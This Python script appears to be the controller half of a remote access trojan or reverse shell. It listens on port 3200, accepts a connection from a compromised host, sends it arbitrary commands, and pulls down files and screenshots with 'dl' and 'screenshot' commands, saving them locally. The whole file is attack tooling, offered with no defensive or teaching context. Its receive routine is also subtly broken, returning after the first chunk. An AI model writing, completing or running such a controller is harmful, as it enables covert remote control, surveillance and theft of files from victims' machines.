import socket
import datetime
import os 


HOST_IP = ""
PORT = 3200
MAX_DATA_SIZE = 1024

def choose_save_location():
    while True:
        dir_path = input("Enter the directory to save the files (or leave blank for current directory): ").strip()
        if not dir_path:
            return os.getcwd()
        if os.path.isdir(dir_path):
            return dir_path
        print("Invalid directory. Please try again.")

save_location = choose_save_location()

def socket_receive_all_data(socket_p, data_len):
     current_data_len = 0
     total_data = None
    # print("socket_receive_all_data_len:",data_len)
     while (current_data_len < data_len ):
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data =socket_p.recv(data_len)
        print(" len:", len(data))
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
        # print("total len:", current_data_len, "/",data_len)
        return total_data

def socket_send_command_and_receive_all_data (socket_p, command):
    if not command :
        return None
    socket_p.sendall(command.encode("utf-8"))
    header = socket_receive_all_data(socket_p, 13)
    length_data = int(header.decode())

    data_receive = socket_receive_all_data(socket_p, length_data)
    return data_receive


# Create a socket object
s = socket.socket()
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
# Connect to the server
# s.connect((HOST_IP, PORT))
print('Successfully connected to the server.')
s.bind((HOST_IP, PORT))
s.listen()
print(f"Waiting for connection ; IP : {HOST_IP} , PORT : {PORT}....")
connection_socket, client_address = s.accept()
print(f"Succesful connection: {client_address}")
dl_filename = None
while True:
    info_data = socket_send_command_and_receive_all_data(connection_socket, "info")
    if not info_data: 
        break
    command= input(str(client_address[0])+": " + str(client_address[0])+ info_data.decode()+ "> ")
    command_split = command.split(" ")

    if len(command_split) == 2  and command_split[0] == "dl":
        dl_filename = command_split[1]
    elif len(command_split) == 2  and command_split[0] == "screenshot":
        now = datetime.datetime.now()
        date_string = now.strftime('%Y-%m-%d_%H-%M-%S')
        dl_filename = f"{command_split[1]}_{date_string}.png"        


    data_receive = socket_send_command_and_receive_all_data(connection_socket, command)

    if not data_receive: 
        break
    if dl_filename:
        # Adjust the save path using the chosen directory
        save_path = os.path.join(save_location, dl_filename)
        
        if len(data_receive) == 1 and data_receive == b" ":
            print("Error", save_path, "do not exist")
        else:
            f= open(save_path, 'wb')
            f.write(data_receive)
            f.close()
            print("File" , save_path, "downloaded")
        dl_filename = None 
    else :
        print(data_receive.decode("utf-8")) 

s.close()
connection_socket.close()